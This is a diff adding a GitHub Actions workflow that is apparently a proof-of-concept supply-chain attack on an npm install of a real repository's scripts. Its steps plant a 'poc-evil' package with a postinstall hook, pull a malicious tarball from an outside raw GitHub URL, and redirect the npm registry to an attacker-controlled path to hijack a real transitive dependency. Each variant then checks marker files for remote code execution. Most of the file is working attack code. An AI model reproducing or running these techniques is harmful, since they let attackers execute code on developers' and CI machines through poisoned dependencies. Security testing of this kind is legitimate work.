@@ -1,0 +1,42 @@
+name: npm Gate Diag2
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  d2:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: publish tarball to workspace-adjacent dir
+        run: |
+          mkdir -p /tmp/stage
+          cp poc-evil-5.0.0.tgz /tmp/stage/ 2>/dev/null || true
+      - name: variant E file dep with exact target command
+        run: |
+          rm -rf /tmp/E && mkdir -p /tmp/E && cd /tmp/E
+          printf 'foreground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          mkdir -p pocpkg
+          printf '{"name":"poc-evil","version":"1.0.0","main":"index.js","scripts":{"postinstall":"node post.js"}}\n' > pocpkg/package.json
+          printf 'module.exports={};\n' > pocpkg/index.js
+          printf 'require("fs").writeFileSync("/tmp/MARK_E","FILE_DEP_SCRIPT_RAN")\n' > pocpkg/post.js
+          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./pocpkg"}}\n' > package.json
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts || echo E_INSTALL_FAILED
+          echo "E:"; cat /tmp/MARK_E 2>/dev/null || echo NO_E
+      - name: variant F url tarball dep with exact target command
+        run: |
+          rm -rf /tmp/F && mkdir -p /tmp/F && cd /tmp/F
+          printf 'foreground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf '{"name":"root2","version":"1.0.0","private":true,"dependencies":{"poc-evil":"https://raw.githubusercontent.com/PDFtoMark/gab-poc-adp-npm/main/poc-evil-5.0.0.tgz"}}\n' > package.json
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts || echo F_INSTALL_FAILED
+          echo "F:"; cat /tmp/MARK_F 2>/dev/null || echo NO_F
+      - name: variant G registry metadata hijack of a real transitive dep
+        run: |
+          rm -rf /tmp/G && mkdir -p /tmp/G && cd /tmp/G
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg2/\nforeground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf '{"name":"root3","version":"1.0.0","private":true,"dependencies":{"gray-matter":"4.0.5"}}\n' > package.json
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts || echo G_INSTALL_FAILED
+          echo "G:"; cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NO_G
+      - name: summary
+        if: always()
+        run: |
+          for m in /tmp/MARK_E /tmp/MARK_F /tmp/ADP_RCE_MARKER; do echo "$m: $(cat $m 2>/dev/null || echo absent)"; done
